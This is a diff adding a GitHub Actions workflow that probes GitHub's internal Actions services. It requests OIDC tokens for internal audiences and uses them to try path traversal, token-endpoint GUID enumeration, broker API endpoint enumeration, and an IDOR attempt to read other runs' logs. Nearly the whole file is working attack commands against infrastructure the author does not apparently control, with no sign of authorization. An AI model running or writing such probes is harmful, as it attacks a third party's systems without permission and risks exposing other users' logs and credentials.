@@ -1,0 +1,111 @@
+name: broker-internal-probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  broker-probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe OIDC request service and broker API
+        run: |
+          echo "=== ACTIONS_ID_TOKEN_REQUEST_URL structure ==="
+          echo "Full URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          # Extract host
+          HOST=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP 'https://[^/]+')
+          PATH_PART=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP 'https://[^/]+\K.*')
+          echo "Host: $HOST"
+          echo "Path: $PATH_PART"
+
+          echo ""
+          echo "=== Probe OIDC service host (no auth) ==="
+          curl -si "$HOST/" 2>/dev/null | head -8
+          echo ""
+          curl -si "$HOST/health" 2>/dev/null | head -5
+          echo ""
+          curl -si "$HOST/_status" 2>/dev/null | head -5
+          echo ""
+
+          echo "=== Try path traversal on OIDC service ==="
+          # Try accessing base path with path traversal
+          BASE=$(echo "$PATH_PART" | grep -oP '^/[0-9]+')
+          echo "Base path: $BASE"
+          # Try: {base}/../../ to get to root
+          curl -si "$HOST$BASE/../../" 2>/dev/null | head -5
+          echo ""
+          # Try accessing the OIDC path but with different orch ID (enumerate)
+          # Original: /188//idtoken/dc9e277a.../726d27fc...
+          # Try replacing GUID
+          curl -si "$HOST$BASE//idtoken/00000000-0000-0000-0000-000000000000/00000000-0000-0000-0000-000000000001?api-version=2.0" \
+            -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" 2>/dev/null | head -5
+          echo ""
+
+      - name: Get broker token and probe broker API
+        run: |
+          echo "=== Get OIDC token for broker ==="
+          BROKER_TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=broker.actions.githubusercontent.com" | jq -r .value)
+          echo "Token length: ${#BROKER_TOKEN}"
+          echo "Token claims: $(echo $BROKER_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null)"
+
+          echo ""
+          echo "=== Probe broker API endpoints ==="
+          BROKER="https://broker.actions.githubusercontent.com"
+          for path in \
+            "/" \
+            "/api" \
+            "/health" \
+            "/v1" \
+            "/v1/runners" \
+            "/v1/agents" \
+            "/v1/jobs" \
+            "/v1/plans" \
+            "/_apis/distributed-task" \
+            "/_apis/hubs"; do
+            STATUS=$(curl -si -H "Authorization: Bearer $BROKER_TOKEN" \
+              "$BROKER$path" 2>/dev/null | head -1)
+            echo "  $path -> $STATUS"
+          done
+
+      - name: Probe results-receiver with broker token
+        run: |
+          echo "=== Get OIDC token for results-receiver ==="
+          RR_TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=results-receiver.actions.githubusercontent.com" | jq -r .value)
+          echo "Token length: ${#RR_TOKEN}"
+
+          RESULTS="https://results-receiver.actions.githubusercontent.com"
+          echo ""
+          echo "=== Probe results-receiver with results token ==="
+          for path in "/" "/rest" "/rest/runs" "/health" "/api"; do
+            STATUS=$(curl -si -H "Authorization: Bearer $RR_TOKEN" \
+              "$RESULTS$path" 2>/dev/null | head -1)
+            echo "  $path -> $STATUS"
+          done
+
+          echo ""
+          echo "=== Try accessing other runs' logs (IDOR test) ==="
+          # Our current run ID in the internal system
+          echo "Current run: $GITHUB_RUN_ID"
+          # Try to access logs for run IDs near ours
+          for run_id in "00000000-0000-0000-0000-000000000001" "11111111-1111-1111-1111-111111111111"; do
+            STATUS=$(curl -si -H "Authorization: Bearer $RR_TOKEN" \
+              "$RESULTS/rest/runs/$run_id/logs" 2>/dev/null | head -1)
+            echo "  /rest/runs/$run_id/logs -> $STATUS"
+          done
+
+      - name: Enumerate run-actions service with different paths
+        run: |
+          HOST=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | grep -oP 'https://[^/]+')
+          echo "Host: $HOST"
+
+          echo ""
+          echo "=== Probe run-actions service API ==="
+          for path in \
+            "/" "/health" "/_apis" \
+            "/1//idtoken" "/100//idtoken" "/188//idtoken" \
+            "/188/status" "/188/jobs" "/188/plans"; do
+            STATUS=$(curl -si -m 3 "$HOST$path" 2>/dev/null | head -1)
+            echo "  $path -> $STATUS"
+          done
